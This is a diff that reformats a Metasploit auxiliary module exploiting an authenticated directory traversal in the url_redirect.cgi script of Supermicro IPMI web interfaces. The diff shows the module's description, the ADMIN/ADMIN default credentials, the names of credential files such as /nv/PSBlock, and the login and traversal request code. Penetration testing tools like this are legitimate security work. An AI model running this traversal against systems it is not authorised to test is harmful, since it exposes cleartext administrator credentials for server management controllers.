@@ -10,34 +10,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
-
   APP_NAME = "Supermicro web interface"
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal',
-      'Description' => %q{
-        This module abuses a directory traversal vulnerability in the url_redirect.cgi application
-        accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability
-        is present due to a lack of sanitization of the url_name parameter. This allows an attacker with
-        a valid, but not necessarily administrator-level account, to access the contents of any file
-        on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
-        all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
-        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
-        /wsman/simple_auth.passwd
-      },
-      'Author'       =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal',
+        'Description' => %q{
+          This module abuses a directory traversal vulnerability in the url_redirect.cgi application
+          accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability
+          is present due to a lack of sanitization of the url_name parameter. This allows an attacker with
+          a valid, but not necessarily administrator-level account, to access the contents of any file
+          on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
+          all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
+          with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
+          /wsman/simple_auth.passwd
+        },
+        'Author' => [
           'hdm', # Discovery and analysis
           'juan vazquez' # Metasploit module
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/' ],
           [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
-      'DisclosureDate' => '2013-11-06'))
+        'DisclosureDate' => '2013-11-06',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -45,7 +51,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),
         OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN']),
         OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN'])
-      ])
+      ]
+    )
   end
 
   def my_basename(filename)
@@ -55,9 +62,10 @@ class MetasploitModule < Msf::Auxiliary
   def is_supermicro?
     res = send_request_cgi(
       {
-        "uri"       => "/",
-        "method"    => "GET"
-      })
+        "uri" => "/",
+        "method" => "GET"
+      }
+    )
 
     if res and res.code == 200 and res.body.to_s =~ /ATEN International Co Ltd\./
       return true
@@ -68,11 +76,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def login
     res = send_request_cgi({
-      "uri"       => "/cgi/login.cgi",
-      "method"    => "POST",
+      "uri" => "/cgi/login.cgi",
+      "method" => "POST",
       "vars_post" => {
         "name" => datastore["USERNAME"],
-        "pwd"  => datastore["PASSWORD"]
+        "pwd" => datastore["PASSWORD"]
       }
     })
 
@@ -91,11 +99,11 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Retrieving file contents...")
 
     res = send_request_cgi({
-      "uri"           => "/cgi/url_redirect.cgi",
-      "method"        => "GET",
-      "cookie"        => session,
+      "uri" => "/cgi/url_redirect.cgi",
+      "method" => "GET",
+      "cookie" => session,
       "encode_params" => false,
-      "vars_get"      => {
+      "vars_get" => {
         "url_type" => "file",
         "url_name" => travs
       }
